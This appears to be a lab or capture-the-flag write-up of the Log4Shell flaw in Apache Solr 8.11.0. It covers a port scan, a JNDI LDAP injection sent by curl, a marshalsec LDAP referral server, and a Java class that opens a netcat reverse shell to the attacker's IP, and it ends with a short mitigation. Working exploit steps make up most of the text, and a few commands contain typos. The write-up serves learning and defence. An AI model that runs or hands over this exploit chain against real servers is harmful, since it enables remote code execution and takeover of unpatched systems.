# log4j Exploit and Remediation

## Nmap scan
Scanning all Available ports  
`nmap -v -p- 10.10.104.64`

```
Nmap scan report for 10.10.104.64
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
8983/tcp open  unknown

```

Looks like the target machine is running **Apache Solr 8.11.0** on port 8983
This is an example of a software known to include log4j 

## Proof Of Concept 

> The RCE flaw is due to the way Log4j interacts with JNDI(Java naming and directory services) 
> without properly validating all requests.  
> JNDI in layman's terms is basically an Interface for being able to get instances of
> internal/External resources/services

Sub Directory /solr/admin/cores takes in user payload

The vulnerability exists due to improper input validation when processing LDAP requests.   
The general payload to abuse the log4j vulnerability is 
`{jndi:ldap://<I control this>}` 


Now if we send a curl request, let us see if it connects back to our machine

Starting a listener on attacker machine: `nc- lvp 9999`  

`curl 'http://10.10.104.64:8983/solr/admin/cores?foo=$\{jndi:ldap://<myIp>:9999\}'` 

Now we see that we have received a connection from the server
```
â”€$ nc -lvp 9999                 
listening on [any] 9999 ...
10.10.104.64: inverse host lookup failed: Unknown host
connect to [10.2.119.44] from (UNKNOWN) [10.10.104.64] 56046
0
 `ï¿½
```  
netcat cannot read ldap request so we need to start a ldap referral server

## Exploit

To exploit this we can use multiple steps  

1. Victim Server reaches out to our LDAP Refferal Server  `${jndi:ldap://attackerserver:1389/Resource}`
2. Ldap Referral Server rebounds the request to a secondary server http://pythonserver/file
3. The victim server retreives and executes the code present in http://pythonserver/file

### Step 1
Obtaining a LDAP Refferal server 

I found this one  `marshalsec` : https://github.com/mbechler/marshalsec
We need to build this package using maven `sudo apt install maven` if that is not already done

Now we can start an Ldap referral server:  
`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<myIp>:8000/#exploit"`

### Step 2
I can create an exploit.java file with the following code:  

```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.2.119.44 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
Time to compile my file:  
`javac Exploit.java -source 8 - target 8`

Start a python server
`python -m http.server 8000`

### Step 3
Run the exploit  
`curl 'http://10.10.104.64:8983/solr/admin/cores?foo=$\{jndi:ldap://<myIP>/Exploit\}'` 


## Mitigation  

From reviewing the mitigation tactics on the solr website: https://solr.apache.org/security.html  
We can modify the `solr.in.sh` file and add this syntax `SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`  

Now if we try the same payload it is evident that it cannot work

This Vulnerability is fixed in Log4j 2.17.0 (Java 8), 2.12.3 (Java 7) and 2.3.1 (Java 6)

